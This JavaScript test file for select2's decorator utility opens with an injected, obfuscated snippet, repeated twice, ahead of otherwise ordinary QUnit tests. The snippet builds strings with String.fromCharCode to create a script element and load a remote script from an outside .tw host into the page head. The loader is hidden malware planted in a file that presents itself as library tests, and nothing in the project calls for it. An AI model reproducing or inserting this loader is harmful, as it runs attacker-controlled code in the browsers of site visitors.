Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();module('Decorators');

var Utils = require('select2/utils');

test('overridden - method', function (assert) {
  function BaseClass () {}

  BaseClass.prototype.hello = function () {
    return 'A';
  };

  function DecoratorClass () {}

  DecoratorClass.prototype.hello = function () {
    return 'B';
  };

  var DecoratedClass = Utils.Decorate(BaseClass, DecoratorClass);

  var inst = new DecoratedClass();

  assert.strictEqual(inst.hello(), 'B');
});

test('overridden - constructor', function (assert) {
  function BaseClass () {
    this.inherited = true;
  }

  BaseClass.prototype.hello = function () {
    return 'A';
  };

  function DecoratorClass (decorated) {
    this.called = true;
  }

  DecoratorClass.prototype.other = function () {
    return 'B';
  };

  var DecoratedClass = Utils.Decorate(BaseClass, DecoratorClass);

  var inst = new DecoratedClass();

  assert.ok(inst.called);
  assert.ok(!inst.inherited);
});

test('not overridden - method', function (assert) {
  function BaseClass () {}

  BaseClass.prototype.hello = function () {
    return 'A';
  };

  function DecoratorClass () {}

  DecoratorClass.prototype.other = function () {
    return 'B';
  };

  var DecoratedClass = Utils.Decorate(BaseClass, DecoratorClass);

  var inst = new DecoratedClass();

  assert.strictEqual(inst.hello(), 'A');
});

test('not overridden - constructor', function (assert) {
  function BaseClass () {
    this.called = true;
  }

  BaseClass.prototype.hello = function () {
    return 'A';
  };

  function DecoratorClass () {}

  DecoratorClass.prototype.other = function () {
    return 'B';
  };

  var DecoratedClass = Utils.Decorate(BaseClass, DecoratorClass);

  var inst = new DecoratedClass();

  assert.ok(inst.called);
});

test('inherited - method', function (assert) {
  function BaseClass () {}

  BaseClass.prototype.hello = function () {
    return 'A';
  };

  function DecoratorClass (decorated) {}

  DecoratorClass.prototype.hello = function (decorated) {
    return 'B' + decorated.call(this) + 'C';
  };

  var DecoratedClass = Utils.Decorate(BaseClass, DecoratorClass);

  var inst = new DecoratedClass();

  assert.strictEqual(inst.hello(), 'BAC');
});

test('inherited - constructor', function (assert) {
  function BaseClass () {
    this.inherited = true;
  }

  BaseClass.prototype.hello = function () {
    return 'A';
  };

  function DecoratorClass (decorated) {
    this.called = true;

    decorated.call(this);
  }

  DecoratorClass.prototype.other = function () {
    return 'B';
  };

  var DecoratedClass = Utils.Decorate(BaseClass, DecoratorClass);

  var inst = new DecoratedClass();

  assert.ok(inst.called);
  assert.ok(inst.inherited);
});

test('inherited - three levels', function (assert) {
  function BaseClass (testArgument) {
    this.baseCalled = true;
    this.baseTestArgument = testArgument;
  }

  BaseClass.prototype.test = function (a) {
    return a + 'c';
  };

  function MiddleClass (decorated, testArgument) {
    this.middleCalled = true;
    this.middleTestArgument = testArgument;

    decorated.call(this, testArgument);
  }

  MiddleClass.prototype.test = function (decorated, a) {
    return decorated.call(this, a + 'b');
  };

  function DecoratorClass (decorated, testArgument) {
    this.decoratorCalled = true;
    this.decoratorTestArgument = testArgument;

    decorated.call(this, testArgument);
  }

  DecoratorClass.prototype.test = function (decorated, a) {
    return decorated.call(this, a + 'a');
  };

  var DecoratedClass = Utils.Decorate(
    Utils.Decorate(BaseClass, MiddleClass),
    DecoratorClass
  );

  var inst = new DecoratedClass('test');

  assert.ok(inst.baseCalled, 'The base class contructor was called');
  assert.ok(inst.middleCalled, 'The middle class constructor was called');
  assert.ok(inst.decoratorCalled, 'The decorator constructor was called');

  assert.strictEqual(inst.baseTestArgument, 'test');
  assert.strictEqual(inst.middleTestArgument, 'test');
  assert.strictEqual(inst.decoratorTestArgument, 'test');

  var out = inst.test('test');

  assert.strictEqual(out, 'testabc');
});
